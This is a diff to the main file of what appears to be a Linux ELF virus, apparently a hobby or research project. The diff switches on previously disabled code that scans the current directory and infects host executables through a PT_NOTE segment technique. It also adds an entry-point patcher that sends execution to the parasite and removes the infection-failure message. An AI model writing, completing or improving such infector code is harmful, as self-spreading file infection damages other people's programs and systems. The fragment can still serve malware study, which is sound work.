@@ -1,5 +1,4 @@
 #include <cstddef>
-#include <expected>
 #include <span>
 #include "common/directory_iterator.hh"
 #include "common/get_symbol_addr.hh"
@@ -11,12 +10,12 @@
 #include "nostdlib/stdlib.hh"
 #include "nostdlib/string.hh"
 #include "nostdlib/unistd.hh"
+#include "redirection/entry_point.hh"
 
 int main(int argc, char* argv[], char* env[]) {
   const char* str = STR_LITERAL("Running virus code1\n");
   vt::write(1, str, vt::strlen(str));
 
-#if 0
   vt::printf("%x %x \n", vt::common::get_parasite_patch_address(),
              vt::common::get_parasite_start_address());
   char dir[] = {'.', 0};
@@ -49,10 +48,11 @@ int main(int argc, char* argv[], char* env[]) {
       tmp[len] = '.';
       tmp[len + 1] = '\0';
 
-      auto new_host = vt::infector::infect<vt::infector::PtNoteInfector>(
-          host_span, parasite, tmp);
+      auto new_host = vt::infector::infect<vt::infector::PtNoteInfector,
+                                           vt::redirection::EntryPointPatcher>(
+          host_span, parasite, tmp,
+          vt::common::get_patch_return_offset_from_parasite_start());
       if (!new_host.valid()) {
-        vt::printf("failed to infect %s\n", host_path);
         continue;
       }
 
@@ -64,6 +64,6 @@ int main(int argc, char* argv[], char* env[]) {
       }
     }
   }
-#endif
+  vt::printf("done\n");
   return 0;
 }
